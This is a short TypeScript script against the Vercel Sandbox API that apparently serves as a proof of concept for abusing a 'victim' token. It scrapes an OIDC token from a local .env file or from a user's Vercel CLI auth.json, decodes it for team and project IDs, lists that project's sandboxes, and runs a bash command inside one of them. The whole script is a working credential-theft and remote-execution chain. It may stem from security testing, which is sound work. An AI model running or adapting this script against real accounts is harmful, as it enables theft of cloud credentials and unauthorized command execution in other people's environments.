import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadToken(): string {
  try {
    const t = readFileSync("/tmp/vercel-sandbox/victima/.env.local","utf8").match(/^VERCEL_OIDC_TOKEN=(.*)$/m)?.[1] ?? "";
    if (t) return t;
  } catch {}
  try {
    const t = readFileSync("/home/edwar/.local/share/com.vercel.cli/auth.json","utf8").match(/"token":\s*"([^"]+)"/)?.[1] ?? "";
    if (t) return t;
  } catch {}
  return "";
}
const VICTIM = loadToken();
let V: any; try { V = JSON.parse(Buffer.from(VICTIM.split(".")[1],"base64url").toString()); } catch { V = {}; }
const teamId = V.owner_id ?? "team_bi7zLiwN9ULZQklHh3rlmq7D";
const projectId = V.project_id ?? "prj_d78xOhTH7oD0Hs2MTmhpSgpPVc7A";
import { APIClient } from "/tmp/vercel-sandbox/node_modules/@vercel/sandbox/dist/api-client/api-client.js";
const raw = (await import("/tmp/vercel-sandbox/node_modules/@vercel/sandbox/dist/api-client/api-client.js")).APIClient;
async function main() {
  const client = new raw({ token: VICTIM, teamId, projectId });
  const l: any = await client.listSandboxes({ projectId, limit: 50 });
  const sbxs = l.json?.sandboxes ?? l.json ?? [];
  console.log("sandboxes:", sbxs.map((s: any) => s.name + ":" + s.status).join(", "));
  const target = sbxs.find((s: any) => s.name?.startsWith("scan2-"));
  if (target) {
    const s = await Sandbox.get({ name: target.name, token: VICTIM, teamId, projectId });
    const r = await s.runCommand("bash", ["-c", "set +e; ss -tln | head; echo alive"], { wait: true, timeout: 20_000 });
    console.log(await r.output("both"));
  }
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });
